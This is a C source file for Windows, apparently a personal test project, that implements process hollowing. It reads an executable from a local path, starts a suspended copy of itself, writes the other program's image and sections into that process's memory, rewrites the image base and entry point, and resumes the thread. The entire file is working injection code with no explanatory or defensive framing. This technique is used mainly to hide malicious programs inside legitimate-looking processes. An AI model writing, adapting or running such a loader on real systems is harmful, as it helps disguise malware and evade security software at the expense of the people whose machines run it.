#include<Windows.h>
#include<stdio.h>



int main()
{
    
    char CurrentFilePath[1024];
    GetModuleFileNameA(0, CurrentFilePath, 1024);
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    DWORD ImageBase;
    LPVOID pImageBase;
    FILE* f = fopen("D:\\CODE\\C For VS\\Project Test\\Test_project\\Release\\ChaiAlime.exe", "rb");
    if (!f) return 1;
    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    fseek(f, 0, SEEK_SET);
    BYTE* process_sample = (BYTE*)malloc(size);
    fread(process_sample, size, 1, f);
    fclose(f);

    PIMAGE_DOS_HEADER dos_header = PIMAGE_DOS_HEADER(process_sample);
    PIMAGE_NT_HEADERS32  nt_header = PIMAGE_NT_HEADERS32(process_sample + dos_header->e_lfanew);
    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));
    if (CreateProcessA(CurrentFilePath, NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        puts("Create Success");

       

        LPCONTEXT ctx = LPCONTEXT(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE));
        ctx->ContextFlags = CONTEXT_FULL;
        if (GetThreadContext(pi.hThread, ctx)) {
            ReadProcessMemory(pi.hProcess, LPCVOID(ctx->Ebx + 8), LPVOID(&ImageBase), 4, 0);

            printf("Image Base : 0x%x\n", ImageBase);
            pImageBase = VirtualAllocEx(pi.hProcess, LPVOID(nt_header->OptionalHeader.ImageBase),nt_header->OptionalHeader.SizeOfImage, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            if (WriteProcessMemory(pi.hProcess, pImageBase, process_sample, nt_header->OptionalHeader.SizeOfImage, NULL))
                printf("Success Inject Image\n");
            else {
                printf("Failed Inject Image\n");
            }
            
            for (int i = 0; i < nt_header->FileHeader.NumberOfSections; i++) {
                PIMAGE_SECTION_HEADER SectionHeader = PIMAGE_SECTION_HEADER(DWORD(process_sample) + dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS32) + (i * 40));

                WriteProcessMemory(pi.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress),
                    LPVOID(DWORD(process_sample) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);
            }
            WriteProcessMemory(pi.hProcess, LPVOID(ctx->Ebx + 8),
                LPVOID(&nt_header->OptionalHeader.ImageBase), 4, 0);

             
            ctx->Eax = DWORD(pImageBase) + nt_header->OptionalHeader.AddressOfEntryPoint;
            SetThreadContext(pi.hThread, LPCONTEXT(ctx));
            ResumeThread(pi.hThread);
        }
         
    }
    else {
        printf("CreateProcess Failed");
    }
    puts("hello");
    return 0;
}
